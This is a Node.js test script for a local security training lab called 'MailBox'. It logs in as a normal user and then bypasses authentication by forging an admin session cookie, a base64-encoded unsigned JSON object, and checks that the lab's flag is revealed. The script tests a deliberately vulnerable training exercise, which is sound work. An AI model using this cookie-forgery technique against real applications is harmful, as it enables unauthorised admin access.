const http = require('http');
const crypto = require('crypto');

const BASE_URL = 'http://localhost:3000';

async function request(method, path, data = null, headers = {}) {
    return new Promise((resolve, reject) => {
        const url = new URL(path, BASE_URL);
        const options = {
            method,
            hostname: url.hostname,
            port: url.port,
            path: url.pathname + url.search,
            headers: {
                ...headers
            }
        };

        if (data) {
            const body = new URLSearchParams(data).toString();
            options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
            options.headers['Content-Length'] = Buffer.byteLength(body);
        }

        const req = http.request(options, (res) => {
            let body = '';
            res.on('data', chunk => body += chunk);
            res.on('end', () => resolve({ statusCode: res.statusCode, headers: res.headers, body }));
        });

        req.on('error', reject);

        if (data) {
            req.write(new URLSearchParams(data).toString());
        }
        req.end();
    });
}

async function runTest() {
    try {
        console.log('Testing MailBox lab...');
        
        // Reset lab
        await request('POST', '/labs/mailbox/reset');
        
        // 1. Normal user workflow
        console.log('[+] Normal user logging in...');
        const loginRes = await request('POST', '/labs/mailbox/login', { username: 'user', password: 'user123' });
        if (loginRes.statusCode !== 302 || !loginRes.headers['set-cookie']) {
            throw new Error('Normal user login failed');
        }
        console.log('[+] Normal user logged in successfully.');

        // 2. Exploit workflow: Forge admin cookie
        console.log('[+] Forging admin cookie...');
        const adminCookie = Buffer.from(JSON.stringify({ user: 'admin' })).toString('base64');
        
        console.log('[+] Accessing lab as admin...');
        const adminRes = await request('GET', '/labs/mailbox/', null, {
            'Cookie': `mailbox_session=${adminCookie}`
        });

        // 3. Verify completion
        if (adminRes.body.includes('MailboxPwned')) {
            console.log('[+] Lab completed successfully! Flag found.');
        } else {
            console.log("Response body:", adminRes.body);
            throw new Error('Exploit failed, flag not found in response');
        }

        console.log('MailBox tests passed.');
    } catch (e) {
        console.error('MailBox test failed:', e);
        process.exit(1);
    }
}

runTest();
